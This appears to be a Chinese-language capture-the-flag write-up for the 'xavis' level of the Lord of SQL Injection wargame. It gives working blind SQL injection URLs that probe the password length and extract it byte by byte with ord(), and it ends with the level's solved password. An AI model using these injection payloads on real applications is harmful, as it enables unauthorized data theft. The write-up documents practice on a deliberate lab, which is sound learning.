Q19_xavis
===

發現長度有點大...
所以不可能手動找了，直接使用Burp Suite。
```
https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw='|| (id='admin' %26%26 length(pw) >16)%23
```
![](https://i.imgur.com/MuXy9dV.png)

得到40位數的0
顯然這並不是密碼，真正的密碼可能屬於**不可視字元**。

此時非得自己寫一個腳本來跑了
跑完腳本之後得到
```
0xb80xfc0xe50xb00xe60xf00xe50xa10xa40xbb
```
透過線上工具轉成:
```
¸üå°æðå¡¤»
```
送出:
```
https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=¸üå°æðå¡¤»
```
但是卻還是過不了...
經過了解，以`u`來說`u`與`ü`會被視為同樣字元，就跟SQL不會嚴格審視大小寫一樣。
所以腳本在跑的時候只要是`u`，頁面就會顯示 Hello admin，所以造成誤判，並與實際的pw不相同。

為了解決這個問題使用 ord 函數，來抓取確切的字元轉為ASCII 的值。
```
https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27%20or%20id=%27admin%27+and+ord(right(left(pw,2),1))=249%23
```

![](https://i.imgur.com/Mm1q0af.png)

結果:
![](https://i.imgur.com/eQdKAnh.png)

```
https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%C2%B8%C3%B9%C3%85%C2%B0%C3%86%C3%90%C3%84%C2%A1%C2%A4%C2%BB
```

補充:
至於UrlEncode後，會出現%c2%c3這個也不是很清楚，剛開始單純以為可以直接透過%b8等方式直接組Payload後送出，但也行不通。
